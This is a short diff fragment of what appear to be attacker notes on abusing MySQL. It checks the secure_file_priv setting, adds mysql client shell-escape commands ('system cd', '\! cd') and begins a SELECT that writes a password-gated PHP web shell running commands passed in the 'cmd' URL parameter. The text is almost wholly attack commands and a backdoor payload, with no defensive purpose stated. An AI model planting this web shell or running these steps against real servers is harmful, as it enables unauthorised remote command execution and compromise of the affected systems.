@@ -12,6 +12,10 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 
 
 
+system cd
+\! cd
+
+
 kalo gagal ubah ke local d
 
 SELECT '<?php if($_GET["pass"]=="Codex") system($_GET["cmd"]); ?>' 
